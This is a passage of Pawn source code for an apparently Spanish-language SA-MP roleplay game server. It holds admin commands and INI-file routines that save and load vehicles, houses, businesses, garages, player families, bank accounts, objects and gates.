	InfoInterior[i][intSalida_z] = z1;
	InfoInterior[i][intSalida_a] = Angle2;

	InfoInterior[i][intInt] = interiorid;
	InfoInterior[i][intTiempo] = Freeze;

	new
	    string[100];

	strcat(string, nombre_int);
	strcat(string, "\n\n"#CINFO"Presione [Y]");

	CreateDynamicPickup(ID_PICKUPINT, 1, InfoInterior[i][intEntrada_x], InfoInterior[i][intEntrada_y], InfoInterior[i][intEntrada_z]);
	CreateDynamic3DTextLabel(string, C_BLANCO, InfoInterior[i][intEntrada_x], InfoInterior[i][intEntrada_y], InfoInterior[i][intEntrada_z]+0.7, 20.0);

	return i;
}

CMD:cord_int_0(playerid, params[])
{
	if(Staff(playerid,Dueno)) return 1;
	if(isnull(params)) return ParamsINC(playerid, "/cord_int_0 [nombre]");

	new
	    Float:x, Float:y, Float:z;

	GetPlayerPos(playerid, x, y, z);
	SetPVarFloat(playerid, "CrearInt_x_0", x);
	SetPVarFloat(playerid, "CrearInt_y_0", y);
	SetPVarFloat(playerid, "CrearInt_z_0", z);
	SetPVarString(playerid, "CrearInt_name", params);

	GetPlayerFacingAngle(playerid, x);
	SetPVarFloat(playerid, "CrearInt_a_0", x);
	Mensaje(playerid, -1, "Ahora, andá al "#CVERDE"interior "#CBLANCO"del lugar y "#CINFO"/cord_int_1");
	return 1;
}

CMD:cord_int_1(playerid, params[])
{
	if(Staff(playerid,Dueno)) return 1;

	new
	    Float:x, Float:y, Float:z, Float:a,
		File: file_ints = fopen("Interiores.txt", io_append),
		Str[200], name[30];

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	GetPVarString(playerid, "CrearInt_name", name, 30);

	A_Format(Str, "/*%s: */CrearInterior(\"%s\",%d,%.3f,%.3f,%.3f,%.3f,%.3f,%.3f,%.3f,%.3f,%d);\r\n",

					name,
					name,

					GetPlayerInterior(playerid),

					GetPVarFloat(playerid, "CrearInt_x_0"),
					GetPVarFloat(playerid, "CrearInt_y_0"),
					GetPVarFloat(playerid, "CrearInt_z_0"),
					GetPVarFloat(playerid, "CrearInt_a_0")+180.0,

					x, y, z, a,

				    strval(params) );

	fwrite(file_ints, Str);
	fclose(file_ints);

	DeletePVar(playerid, "CrearInt_name");
	DeletePVar(playerid, "CrearInt_x_0");
	DeletePVar(playerid, "CrearInt_y_0");
	DeletePVar(playerid, "CrearInt_z_0");
	DeletePVar(playerid, "CrearInt_a_0");

	Mensaje(playerid, -1, "Exportado a "#CINFO"Interiores.txt");
	return 1;
}

// - Sistema de vehículos

stock ActualizarVehiculo(i)
{
	new iStr[22];
	format(iStr, sizeof(iStr), "Vehiculos/%d.ini", i);
	new INI:VArch = INI_Open(iStr);

	INI_SetTag(VArch,"data");
	INI_WriteInt(VArch,"Modelo", InfoVeh[i][vModelo]);
	INI_WriteInt(VArch,"Color1", InfoVeh[i][vColor1]);
	INI_WriteInt(VArch,"Color2", InfoVeh[i][vColor2]);
	INI_WriteInt(VArch,"Precio", InfoVeh[i][vPrecio]);
	INI_WriteString(VArch,"Dueño", InfoVeh[i][vComprador]);
	INI_WriteFloat(VArch,"vPosX", InfoVeh[i][vPosX]);
	INI_WriteFloat(VArch,"vPosY", InfoVeh[i][vPosY]);
	INI_WriteFloat(VArch,"vPosZ", InfoVeh[i][vPosZ]);
	INI_WriteFloat(VArch,"vPosA", InfoVeh[i][vPosA]);
	INI_WriteString(VArch,"Placa", InfoVeh[i][vPlaca]);
	INI_WriteInt(VArch,"PaintJ", InfoVeh[i][vPintadoJ]);
	// Guardar TUNING
	new Str[15];
	Loop(a,MAX_VEH_MODS,0)
	{
		A_Format(Str,"vMod_%d",a);
		INI_WriteInt(VArch,Str, vMods[i][a]);
	}
	INI_WriteBool(VArch,"Usado", InfoVeh[i][vUsado]);

	INI_WriteBool(VArch,"Cerrado", InfoVeh[i][vCerrado]);
	INI_WriteInt(VArch,"Familia", InfoVeh[i][vFamilia]);
	INI_WriteInt(VArch,"Interior", InfoVeh[i][vInt]);
	INI_WriteInt(VArch,"VirtualWorld", InfoVeh[i][vVW]);
	INI_WriteFloat(VArch,"Metros_recorridos", InfoVeh[i][vMetros]);
	Loop(a, MAX_ARMAS_VEH, 0)
	{
	    A_Format(Str,"Arma_%d", a);
		INI_WriteInt(VArch,Str, InfoVeh[i][vArma][a]);
	    A_Format(Str,"Balas_%d", a);
		INI_WriteInt(VArch,Str, InfoVeh[i][vBalas][a]);
	}

	INI_Close(VArch);
 	return 1;
}

CALLBACK: CargarVehiculo_data(i,name[],value[])
{
	INI_Int("Modelo",InfoVeh[i][vModelo]);
	INI_Int("Color1",InfoVeh[i][vColor1]);
	INI_Int("Color2",InfoVeh[i][vColor2]);
	INI_Int("Precio",InfoVeh[i][vPrecio]);
	INI_String("Dueño",InfoVeh[i][vComprador],MAX_PLAYER_NAME);
	INI_Float("vPosX",InfoVeh[i][vPosX]);
	INI_Float("vPosY",InfoVeh[i][vPosY]);
	INI_Float("vPosZ",InfoVeh[i][vPosZ]);
	INI_Float("vPosA",InfoVeh[i][vPosA]);
	INI_String("Placa",InfoVeh[i][vPlaca],MAX_PLAYER_NAME);
	INI_Int("PaintJ",InfoVeh[i][vPintadoJ]);
	INI_Bool("Cerrado",InfoVeh[i][vCerrado]);
	INI_Bool("Usado",InfoVeh[i][vUsado]);
	INI_Int("Familia",InfoVeh[i][vFamilia]);
	INI_Int("Interior",InfoVeh[i][vInt]);
	INI_Int("VirtualWorld",InfoVeh[i][vVW]);
	INI_Float("Metros_recorridos", InfoVeh[i][vMetros]);

	//mods
	new Str[15];
	Loop(a,MAX_VEH_MODS,0)
	{
		A_Format(Str,"vMod_%d",a);
		INI_Int(Str, vMods[i][a]);
	}
	Loop(a, MAX_ARMAS_VEH, 0)
	{
	    A_Format(Str,"Arma_%d", a);
		INI_Int(Str, InfoVeh[i][vArma][a]);
	    A_Format(Str,"Balas_%d", a);
		INI_Int(Str, InfoVeh[i][vBalas][a]);
	}
	return 1;
}

stock CargarVehiculos()
{
	new
		VArch[18];

	Loop(v,MAX_VEH_VENTA,1)
	{
		A_Format(VArch,"Vehiculos/%d.ini",v);
    	if(fexist(VArch))
    	{
			INI_ParseFile(VArch,"CargarVehiculo_%s",.bExtra = true, .extra = v);
			if(InfoVeh[v][vModelo] > 399 && InfoVeh[v][vModelo] < 611)
			{
				new
					VehID = CreateVehicle(InfoVeh[v][vModelo], InfoVeh[v][vPosX], InfoVeh[v][vPosY], InfoVeh[v][vPosZ], InfoVeh[v][vPosA], InfoVeh[v][vColor1], InfoVeh[v][vColor2],HORAS_RVEH);

				SetVehicleNumberPlate(VehID, InfoVeh[v][vPlaca]);
				ChangeVehiclePaintjob(VehID, InfoVeh[v][vPintadoJ]);
				SetVehicleVirtualWorld(VehID, InfoVeh[v][vVW]);
				LinkVehicleToInterior(VehID,InfoVeh[v][vInt]);
				Iter_Add(VehVenta,v);
			  	VehVenta_ID(VehID) = v;
			  	ID_VehOriginal[v] = VehID;
		    	Total_Vehiculos_Creados++;
		    	if(InfoVeh[v][vCerrado])
				{
					SetTimerEx("CerrarPuertas",50,false,"i",VehID);
				}
				Loop(m,MAX_VEH_MODS,0)
				{
					if(vMods[v][m])
					{
					    new vehicleide = GetVehicleModel(VehID);
					    new modok = islegalcarmod(vehicleide, vMods[v][m]);

					    if (modok)
						{
							AddVehicleComponent(VehID, vMods[v][m]);
					    }
					}
				}
			}
			else
			{
				fremove(VArch);
			}
		}
	}
	printf("*- Sistema de vehículos cargado (%d)",Total_Vehiculos_Creados);
	return 1;
}

CALLBACK: CargarNegocio_data(n,name[],value[])
{
	INI_String("Nombre",InfoNegocio[n][nNombre],30);
	INI_String("Dueño",InfoNegocio[n][nComprador],MAX_PLAYER_NAME);
	INI_Int("Contraseña",InfoNegocio[n][nContra]);

	INI_Int("Dinero",InfoNegocio[n][nDinero]);
	INI_Int("Precio_Entrada",InfoNegocio[n][nPrecioEntrada]);
	INI_Int("Precio",InfoNegocio[n][nPrecio]);
	INI_Int("VirtualWorld",InfoNegocio[n][nVW]);
	INI_Int("Interior",InfoNegocio[n][nInt]);
	INI_Int("Tipo",InfoNegocio[n][nTipo]);
	INI_Int("Icono",InfoNegocio[n][nIcono]);

	INI_Bool("Comprado",InfoNegocio[n][nComprado]);
	INI_Bool("Cerrado",InfoNegocio[n][nCerrado]);

	INI_Float("Entrada_x",InfoNegocio[n][nEntrada_x]);
	INI_Float("Entrada_y",InfoNegocio[n][nEntrada_y]);
	INI_Float("Entrada_z",InfoNegocio[n][nEntrada_z]);

	INI_Float("Salida_x",InfoNegocio[n][nSalida_x]);
	INI_Float("Salida_y",InfoNegocio[n][nSalida_y]);
	INI_Float("Salida_z",InfoNegocio[n][nSalida_z]);

	return 1;
}

stock ActualizarNegocio(nid)
{
	new NArch[20];
 	format(NArch,sizeof(NArch),"Negocios/%d.ini",nid);

	new INI:Arch = INI_Open(NArch);

	INI_SetTag(Arch,"data");
	INI_WriteString(Arch,"Nombre",InfoNegocio[nid][nNombre]);
	INI_WriteString(Arch,"Dueño",InfoNegocio[nid][nComprador]);
	INI_WriteInt(Arch,"Contraseña",InfoNegocio[nid][nContra]);

	INI_WriteInt(Arch,"Dinero",InfoNegocio[nid][nDinero]);
	INI_WriteInt(Arch,"Precio_Entrada",InfoNegocio[nid][nPrecioEntrada]);
	INI_WriteInt(Arch,"Precio",InfoNegocio[nid][nPrecio]);
	INI_WriteInt(Arch,"VirtualWorld",InfoNegocio[nid][nVW]);
	INI_WriteInt(Arch,"Interior",InfoNegocio[nid][nInt]);
	INI_WriteInt(Arch,"Tipo",InfoNegocio[nid][nTipo]);
	INI_WriteInt(Arch,"Icono",InfoNegocio[nid][nIcono]);

	INI_WriteBool(Arch,"Comprado",InfoNegocio[nid][nComprado]);
	INI_WriteBool(Arch,"Cerrado",InfoNegocio[nid][nCerrado]);

	INI_WriteFloat(Arch,"Entrada_x",InfoNegocio[nid][nEntrada_x]);
	INI_WriteFloat(Arch,"Entrada_y",InfoNegocio[nid][nEntrada_y]);
	INI_WriteFloat(Arch,"Entrada_z",InfoNegocio[nid][nEntrada_z]);

	INI_WriteFloat(Arch,"Salida_x",InfoNegocio[nid][nSalida_x]);
	INI_WriteFloat(Arch,"Salida_y",InfoNegocio[nid][nSalida_y]);
	INI_WriteFloat(Arch,"Salida_z",InfoNegocio[nid][nSalida_z]);

	INI_Close(Arch);
	return 1;
}

stock CargarNegocios()
{
	new
		NArch[20],
		n;

	while(n < MAX_NEGOCIOS)
	{
	    format(NArch,sizeof(NArch),"Negocios/%d.ini",n);
    	if(fexist(NArch))
    	{
			++Total_Negocios_Creados;
			INI_ParseFile(NArch,"CargarNegocio_%s",.bExtra = true, .extra = n);
			AddStaticPickup(ID_PICKUPNEGOCIO,1,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]);
			ActualizarNegLabel(n, true);
			CreateDynamicMapIcon(InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z],InfoNegocio[n][nIcono],-1);
			Iter_Add(Negocios,n);
		}
		n++;
	}
	printf("*- Sistema de negocios cargado (%d)",Total_Negocios_Creados);
	return 1;
}

CALLBACK: CargarCasa_data(c,name[],value[])
{
	INI_String("Nombre",InfoCasa[c][cNombre],30);
	INI_String("Dueño",InfoCasa[c][cComprador],MAX_PLAYER_NAME);
	INI_Int("Contraseña",InfoCasa[c][cContra]);

	INI_Int("Dinero",InfoCasa[c][cDinero]);
	INI_Int("Precio",InfoCasa[c][cPrecio]);
	INI_Int("VirtualWorld",InfoCasa[c][cVW]);
	INI_Int("Interior",InfoCasa[c][cInt]);

	INI_Bool("Comprada",InfoCasa[c][cComprada]);
	INI_Bool("Cerrada",InfoCasa[c][cCerrada]);

	INI_Float("Entrada_x",InfoCasa[c][cEntrada_x]);
	INI_Float("Entrada_y",InfoCasa[c][cEntrada_y]);
	INI_Float("Entrada_z",InfoCasa[c][cEntrada_z]);

	INI_Float("Salida_x",InfoCasa[c][cSalida_x]);
	INI_Float("Salida_y",InfoCasa[c][cSalida_y]);
	INI_Float("Salida_z",InfoCasa[c][cSalida_z]);

	INI_Int("Familia",InfoCasa[c][cFamilia]);

	new Str[15];
	Loop(i,10,0)
	{
	    A_Format(Str,"Arma_%d",i);
		INI_Int(Str,InfoCasa[c][cArmas][i]);
	}
	Loop(i,10,0)
	{
	    A_Format(Str,"Bala_%d",i);
		INI_Int(Str,InfoCasa[c][cBalas][i]);
	}

	Loop(i,MAX_MUEBLES_CASA,0)
	{
	    A_Format(Str,"ObjData_%d", i);
	    INI_String(Str, cObjData[i], 70);
	}
	INI_Int("Contraseña_puerta", InfoCasa[c][cContra_puerta]);
	return 1;
}

CALLBACK: CargarInt_data(i,name[],value[])
{
	INI_Int("Interior",InfoInteriorCasa[i][iInt]);
	INI_Float("Pos_x",InfoInteriorCasa[i][iPos_x]);
	INI_Float("Pos_y",InfoInteriorCasa[i][iPos_y]);
	INI_Float("Pos_z",InfoInteriorCasa[i][iPos_z]);
	INI_String("Nombre",InfoInteriorCasa[i][iNombre],24);
	return 1;
}

stock ActualizarCasa(cid, bool:General = true, Mueble = -1, bool:Armas = false)
{

	new CArch[20];
 	format(CArch,sizeof(CArch),"Casas/%d.ini",cid);

	new INI:Arch = INI_Open(CArch);

	INI_SetTag(Arch,"data");

	new Str[12],Str2[70];

	if(General)
	{
		INI_WriteString(Arch,"Nombre",InfoCasa[cid][cNombre]);
		INI_WriteString(Arch,"Dueño",InfoCasa[cid][cComprador]);
		INI_WriteInt(Arch,"Contraseña",InfoCasa[cid][cContra]);

		INI_WriteInt(Arch,"Dinero",InfoCasa[cid][cDinero]);
		INI_WriteInt(Arch,"Precio",InfoCasa[cid][cPrecio]);
		INI_WriteInt(Arch,"VirtualWorld",InfoCasa[cid][cVW]);
		INI_WriteInt(Arch,"Interior",InfoCasa[cid][cInt]);

		INI_WriteBool(Arch,"Comprada",InfoCasa[cid][cComprada]);
		INI_WriteBool(Arch,"Cerrada",InfoCasa[cid][cCerrada]);

		INI_WriteFloat(Arch,"Entrada_x",InfoCasa[cid][cEntrada_x]);
		INI_WriteFloat(Arch,"Entrada_y",InfoCasa[cid][cEntrada_y]);
		INI_WriteFloat(Arch,"Entrada_z",InfoCasa[cid][cEntrada_z]);

		INI_WriteFloat(Arch,"Salida_x",InfoCasa[cid][cSalida_x]);
		INI_WriteFloat(Arch,"Salida_y",InfoCasa[cid][cSalida_y]);
		INI_WriteFloat(Arch,"Salida_z",InfoCasa[cid][cSalida_z]);

		INI_WriteInt(Arch,"Familia",InfoCasa[cid][cFamilia]);
		INI_WriteInt(Arch,"Contraseña_puerta", InfoCasa[cid][cContra_puerta]);
	}

	if(Armas)
	{
		Loop(i,10,0)
		{
		    A_Format(Str,"Arma_%d",i);
			INI_WriteInt(Arch,Str,InfoCasa[cid][cArmas][i]);
		}
		Loop(i,10,0)
		{
		    A_Format(Str,"Bala_%d",i);
			INI_WriteInt(Arch,Str,InfoCasa[cid][cBalas][i]);
		}
	}
	if(Mueble != -1 && Mueble < MAX_MUEBLES_CASA)
	{
		format(Str2,70,"%d|%.03f|%.03f|%.03f|%.03f|%.03f|%.03f", InfoCasa[cid][cObjModel][Mueble], InfoCasa[cid][cObjPosX][Mueble], InfoCasa[cid][cObjPosY][Mueble],
		InfoCasa[cid][cObjPosZ][Mueble],
		InfoCasa[cid][cObjRotX][Mueble],
	 	InfoCasa[cid][cObjRotY][Mueble],
		InfoCasa[cid][cObjRotZ][Mueble]);
	    A_Format(Str,"ObjData_%d", Mueble);
		INI_WriteString(Arch, Str, Str2);
	}
	INI_Close(Arch);

	return 1;
}

stock CargarCasas()
{
	new CArch[22],c;

	while(c < MAX_CASAS)
	{
	    format(CArch,sizeof(CArch),"Casas/%d.ini",c);
    	if(fexist(CArch))
    	{
			++Total_Casas_Creadas;
			INI_ParseFile(CArch,"CargarCasa_%s",.bExtra = true, .extra = c);
			AddStaticPickup(ID_PICKUPCASA,1,InfoCasa[c][cEntrada_x],InfoCasa[c][cEntrada_y],InfoCasa[c][cEntrada_z]);
			ActualizarCasaLabel(c, true);
			Iter_Add(Casas, c);
			Loop(i,MAX_MUEBLES_CASA,0)
			{
    			unformat(cObjData[i],"p<|>iffffff",
				InfoCasa[c][cObjModel][i],
				InfoCasa[c][cObjPosX][i],
				InfoCasa[c][cObjPosY][i],
				InfoCasa[c][cObjPosZ][i],
				InfoCasa[c][cObjRotX][i],
				InfoCasa[c][cObjRotY][i],
				InfoCasa[c][cObjRotZ][i]);
				ClearString(cObjData[i]);
			}
		}
		c++;
	}
	printf("*- Sistema de casas cargado (%d)",Total_Casas_Creadas);
	return 1;
}

stock CargarInteriores_C()
{
	new
		IArch[36],
		c;

	while(c < MAX_INTERIORES_CASA)
	{
	    format(IArch,sizeof(IArch),"Casas/Interiores/%d.ini",c);
    	if(fexist(IArch))
    	{
			++Total_Interiores_Creados;
			INI_ParseFile(IArch,"CargarInt_%s",.bExtra = true, .extra = c);
		}
		c++;
	}
	printf("*- Sistema de interiores [CASAS] cargado (%d)",Total_Interiores_Creados);
	return 1;
}

stock ActualizarInt(cid)
{
	new CArch[26];
 	format(CArch,sizeof(CArch),"Casas/Interiores/%d.ini",cid);

	new INI:Arch = INI_Open(CArch);

	INI_SetTag(Arch,"data");

	INI_WriteInt(Arch,"Interior",InfoInteriorCasa[cid][iInt]);
	INI_WriteFloat(Arch,"Pos_x",InfoInteriorCasa[cid][iPos_x]);
	INI_WriteFloat(Arch,"Pos_y",InfoInteriorCasa[cid][iPos_y]);
	INI_WriteFloat(Arch,"Pos_z",InfoInteriorCasa[cid][iPos_z]);
	INI_WriteString(Arch,"Nombre",InfoInteriorCasa[cid][iNombre]);

	INI_Close(Arch);
	return 1;
}


stock CargarGarages()
{
	new
		gArch[22],
		g;

	Loop(i,3,0) CreateDynamic3DTextLabel(LABEL_GARAGE_S,C_BLANCO,InfoPGarage[i][Posx],InfoPGarage[i][Posy],InfoPGarage[i][Posz]+1,5);

	while(g < MAX_GARAGES)
	{
	    format(gArch,sizeof(gArch),"Casas/Garages/%d.ini",g);
    	if(fexist(gArch))
    	{
			++Total_Garages_Creados;
			INI_ParseFile(gArch,"CargarGarage_%s",.bExtra = true, .extra = g);
			CreateDynamic3DTextLabel(LABEL_GARAGE_E,C_BLANCO,InfoGarage[g][gExt_x],InfoGarage[g][gExt_y],InfoGarage[g][gExt_z]+1,10);
			Iter_Add(Garages,g);
		}
		g++;
	}
	printf("*- Sistema de garages cargado (%d)",Total_Garages_Creados);
	return 1;
}

stock ActualizarGarage(gid)
{
	new CArch[26];
 	format(CArch,sizeof(CArch),"Casas/Garages/%d.ini",gid);

	new INI:Arch = INI_Open(CArch);

	INI_SetTag(Arch,"data");

	INI_WriteInt(Arch,"Interior",InfoGarage[gid][gInt]);
	INI_WriteInt(Arch,"Virtual_world",InfoGarage[gid][gVW]);
	INI_WriteInt(Arch,"ID_Casa",InfoGarage[gid][gIDCasa]);

	INI_WriteBool(Arch,"Cerrado",InfoGarage[gid][gCerrado]);

	INI_WriteFloat(Arch,"IntV_x",InfoGarage[gid][gIntV_x]);
	INI_WriteFloat(Arch,"IntV_y",InfoGarage[gid][gIntV_y]);
	INI_WriteFloat(Arch,"Int_x",InfoGarage[gid][gInt_x]);
	INI_WriteFloat(Arch,"Int_y",InfoGarage[gid][gInt_y]);
	INI_WriteFloat(Arch,"Int_z",InfoGarage[gid][gInt_z]);
	INI_WriteFloat(Arch,"Ext_x",InfoGarage[gid][gExt_x]);
	INI_WriteFloat(Arch,"Ext_y",InfoGarage[gid][gExt_y]);
	INI_WriteFloat(Arch,"Ext_z",InfoGarage[gid][gExt_z]);
	INI_WriteFloat(Arch,"ExtV_x",InfoGarage[gid][gExtV_x]);
	INI_WriteFloat(Arch,"ExtV_y",InfoGarage[gid][gExtV_y]);
	INI_WriteFloat(Arch,"Ang",InfoGarage[gid][gAng]);

	INI_Close(Arch);
	return 1;
}

CALLBACK: CargarGarage_data(i,name[],value[])
{
	INI_Int("Interior",InfoGarage[i][gInt]);
	INI_Int("Virtual_world",InfoGarage[i][gVW]);
	INI_Int("ID_Casa",InfoGarage[i][gIDCasa]);

	INI_Bool("Cerrado",InfoGarage[i][gCerrado]);

	INI_Float("IntV_x",InfoGarage[i][gIntV_x]);
	INI_Float("IntV_y",InfoGarage[i][gIntV_y]);
	INI_Float("Int_x",InfoGarage[i][gInt_x]);
	INI_Float("Int_y",InfoGarage[i][gInt_y]);
	INI_Float("Int_z",InfoGarage[i][gInt_z]);
	INI_Float("Ext_x",InfoGarage[i][gExt_x]);
	INI_Float("Ext_y",InfoGarage[i][gExt_y]);
	INI_Float("Ext_z",InfoGarage[i][gExt_z]);
	INI_Float("ExtV_x",InfoGarage[i][gExtV_x]);
	INI_Float("ExtV_y",InfoGarage[i][gExtV_y]);
	INI_Float("Ang",InfoGarage[i][gAng]);
	return 1;
}

stock CargarFamilias()
{
	new
		IArch[18*MAX_FAMILIAS],
		c = 1;

	while(c < MAX_FAMILIAS)
	{
	    format(IArch,sizeof(IArch),"Familias/%d.ini",c);
    	if(fexist(IArch))
    	{
			++Total_Familias_Creadas;
			INI_ParseFile(IArch,"CargarFam_%s",.bExtra = true, .extra = c);
		}
		c++;
	}
	printf("*- Sistema de familias cargado (%d)",Total_Familias_Creadas);
	return 1;
}


stock ActualizarFamilia(cid)
{
	if(!cid || cid > MAX_FAMILIAS)
	{
	    printf("BUG: Se intento actualizar la familia ID %d.", cid);
	    return 0;
	}
	
	new IArch[26];
 	format(IArch,sizeof(IArch),"Familias/%d.ini",cid);

	new INI:Arch = INI_Open(IArch);

	INI_SetTag(Arch,"data");

	INI_WriteString(Arch,"Nombre",InfoFamilia[cid][fNombre]);
	INI_WriteString(Arch,"Dinero",InfoFamilia[cid][fContra]);
	//Rangos
	INI_WriteString(Arch,"Rango_1",InfoFamilia[cid][fRango_1]);
	INI_WriteString(Arch,"Rango_2",InfoFamilia[cid][fRango_2]);
	INI_WriteString(Arch,"Rango_3",InfoFamilia[cid][fRango_3]);
	INI_WriteString(Arch,"Rango_4",InfoFamilia[cid][fRango_4]);
	INI_WriteString(Arch,"Rango_5",InfoFamilia[cid][fRango_5]);
	INI_WriteString(Arch,"Nombre_lider",InfoFamilia[cid][fNombre_L]);

	INI_WriteInt(Arch,"Dinero",InfoFamilia[cid][fDinero]);

	INI_WriteFloat(Arch,"Pos_x",InfoFamilia[cid][fPos_x]);
	INI_WriteFloat(Arch,"Pos_y",InfoFamilia[cid][fPos_y]);
	INI_WriteFloat(Arch,"Pos_z",InfoFamilia[cid][fPos_z]);

	INI_WriteString(Arch,"Lider",InfoFamilia[cid][fLider]);
	INI_WriteInt(Arch,"Miembros",InfoFamilia[cid][fMiembros]);

	INI_WriteBool(Arch,"Pandilla", InfoFamilia[cid][fPandilla] );
	INI_Close(Arch);
	return 1;
}

CALLBACK: CargarFam_data(i,name[],value[])
{
	INI_String("Nombre",InfoFamilia[i][fNombre],32);
	INI_String("Dinero",InfoFamilia[i][fContra],24);

	//Rangos
	INI_String("Rango_1",InfoFamilia[i][fRango_1],24);
	INI_String("Rango_2",InfoFamilia[i][fRango_2],24);
	INI_String("Rango_3",InfoFamilia[i][fRango_3],24);
	INI_String("Rango_4",InfoFamilia[i][fRango_4],24);
	INI_String("Rango_5",InfoFamilia[i][fRango_5],24);
	INI_String("Nombre_lider",InfoFamilia[i][fNombre_L],24);

	INI_Int("Dinero",InfoFamilia[i][fDinero]);

	INI_Float("Pos_x",InfoFamilia[i][fPos_x]);
	INI_Float("Pos_y",InfoFamilia[i][fPos_y]);
	INI_Float("Pos_z",InfoFamilia[i][fPos_z]);

	INI_String("Lider",InfoFamilia[i][fLider], MAX_PLAYER_NAME);
	INI_Int("Miembros",InfoFamilia[i][fMiembros]);

	INI_Bool("Pandilla",InfoFamilia[i][fPandilla]);
	return 1;
}


stock MensajeFamilia(famid,msg[])
{
	foreach(Player,i)
	{
	    if(InfoJugador[i][jLiderFam] | InfoJugador[i][jMiembroFam] == famid)
		{
	    	Mensaje(i,-1,msg);
		}
	}
	return 1;
}


stock CargarCuentasBancarias()
{
	new Arch[16];
	Loop(i,MAX_CUENTAS_BANCARIAS,0)
	{
		A_Format(Arch,"Banco/%d.ini",i);
		if(fexist(Arch))
		{
			++Total_Cuentas_Bancarias;
			INI_ParseFile(Arch,"CargarCB_%s",.bExtra = true, .extra = i);
		}
	}
	return 1;
}

CALLBACK: CargarCB_data(i,name[],value[])
{
	INI_String("Nombre",InfoCuentaB[i][cuenNombre],MAX_PLAYER_NAME);
	INI_Int("Dinero",InfoCuentaB[i][cuenDinero]);
	return 1;
}

stock ActualizarCuentaB(i)
{
	new Arch2[16];
	A_Format(Arch2,"Banco/%d.ini",i);
	new INI:Arch = INI_Open(Arch2);

	INI_SetTag(Arch,"data");

	INI_WriteString(Arch,"Nombre",InfoCuentaB[i][cuenNombre]);
	INI_WriteInt(Arch,"Dinero",InfoCuentaB[i][cuenDinero]);

	INI_Close(Arch);
	return 1;
}

stock CargarObjetos()
{
	Loop(i,MAX_OBJETOS,0)
	{
	    new Arch[16];
		A_Format(Arch,"Objetos/%d.ini",i);
		if(fexist(Arch))
		{
			++Total_Objetos_Creados;
			INI_ParseFile(Arch,"CargarObj_%s",.bExtra = true, .extra = i);
			Objeto[i][oID] = CreateDynamicObject(Objeto[i][oIDModel],Objeto[i][oPosx],Objeto[i][oPosy],Objeto[i][oPosz],Objeto[i][oAngx],Objeto[i][oAngy],Objeto[i][oAngz]);
			#define IDO i
			if(Objeto[i][oColor])
			{
	 			SetDynamicObjectMaterialText(Objeto[IDO][oID],Objeto[IDO][oIndexO],Objeto[IDO][oNombre],Objeto[IDO][oTamanoO],"Arial",Objeto[IDO][oTamano],1,Objeto[IDO][oColor]);
			}
			#undef IDO
		}
	}
	return 1;
}

CALLBACK: CargarObj_data(i,name[],value[])
{
	INI_Int("ID_Model",Objeto[i][oIDModel]);
	INI_Int("Tamaño",Objeto[i][oTamano]);
	INI_Int("Color",Objeto[i][oColor]);
	INI_Int("Tamaño_o",Objeto[i][oTamanoO]);
	INI_Int("Index_o",Objeto[i][oIndexO]);

	INI_Float("Pos_x",Objeto[i][oPosx]);
	INI_Float("Pos_y",Objeto[i][oPosy]);
	INI_Float("Pos_z",Objeto[i][oPosz]);
	INI_Float("Ang_x",Objeto[i][oAngx]);
	INI_Float("Ang_y",Objeto[i][oAngy]);
	INI_Float("Ang_z",Objeto[i][oAngz]);

	INI_String("Nombre",Objeto[i][oNombre],30);
	return 1;
}

stock CargarPortones()
{
	new
		i = -1,
		string[18];

	while(i++ != MAX_PORTONES)
	{
	    format(string,sizeof(string),"Portones/%d.ini",i);
	    if(fexist(string))
	    {
	    	INI_ParseFile(string,"CargarPorton_data",.bExtra = true, .extra = i);
			InfoPorton_Ex[i][portID] = CreateDynamicObject( InfoPorton_Ex[i][portModel],
															InfoPorton_Ex[i][pX],
															InfoPorton_Ex[i][pY],
															InfoPorton_Ex[i][pZ],
															InfoPorton_Ex[i][pRX],
															InfoPorton_Ex[i][pRY],
															InfoPorton_Ex[i][pRZ]);
		}
	}
	print("*- Sistema de portones cargado.");
	return 1;
}

CALLBACK: CargarPorton_data(i,name[],value[])
{
	INI_Int("ID",InfoPorton_Ex[i][portModel]);
	INI_Float("Pos_x",InfoPorton_Ex[i][pX]);
	INI_Float("Pos_y",InfoPorton_Ex[i][pY]);
	INI_Float("Pos_z",InfoPorton_Ex[i][pZ]);
	INI_Float("Rot_x",InfoPorton_Ex[i][pRX]);
	INI_Float("Rot_y",InfoPorton_Ex[i][pRY]);
	INI_Float("Rot_z",InfoPorton_Ex[i][pRZ]);
	INI_Float("Abierto_x",InfoPorton_Ex[i][pAX]);
	INI_Float("Abierto_y",InfoPorton_Ex[i][pAY]);
	INI_Float("Abierto_z",InfoPorton_Ex[i][pAZ]);
	INI_Float("Velocidad",InfoPorton_Ex[i][portVelocidad]);
	INI_Int("Familia",InfoPorton_Ex[i][portFamilia]);
	INI_Int("Casa",InfoPorton_Ex[i][portCasa]);
	return 1;
}

stock ActualizarPorton(i)
{
	new string[22];
 	format(string,sizeof(string),"Portones/%d.ini",i);
 	new INI:Arch = INI_Open(string);

	INI_WriteInt(Arch,"ID",InfoPorton_Ex[i][portModel]);
	INI_WriteFloat(Arch,"Pos_x",InfoPorton_Ex[i][pX]);
	INI_WriteFloat(Arch,"Pos_y",InfoPorton_Ex[i][pY]);
	INI_WriteFloat(Arch,"Pos_z",InfoPorton_Ex[i][pZ]);
	INI_WriteFloat(Arch,"Rot_x",InfoPorton_Ex[i][pRX]);
	INI_WriteFloat(Arch,"Rot_y",InfoPorton_Ex[i][pRY]);
	INI_WriteFloat(Arch,"Rot_z",InfoPorton_Ex[i][pRZ]);
	INI_WriteFloat(Arch,"Abierto_x",InfoPorton_Ex[i][pAX]);
	INI_WriteFloat(Arch,"Abierto_y",InfoPorton_Ex[i][pAY]);
	INI_WriteFloat(Arch,"Abierto_z",InfoPorton_Ex[i][pAZ]);
	INI_WriteFloat(Arch,"Velocidad",InfoPorton_Ex[i][portVelocidad]);
	INI_WriteInt(Arch,"Familia",InfoPorton_Ex[i][portFamilia]);
	INI_WriteInt(Arch,"Casa",InfoPorton_Ex[i][portCasa]);
	INI_Close(Arch);
	return 1;
}


stock ActualizarObjeto(i)
{
	new Arch2[16];
	A_Format(Arch2,"Objetos/%d.ini",i);
	new INI:Arch = INI_Open(Arch2);

	INI_SetTag(Arch,"data");

	INI_WriteInt(Arch,"ID_Model",Objeto[i][oIDModel]);
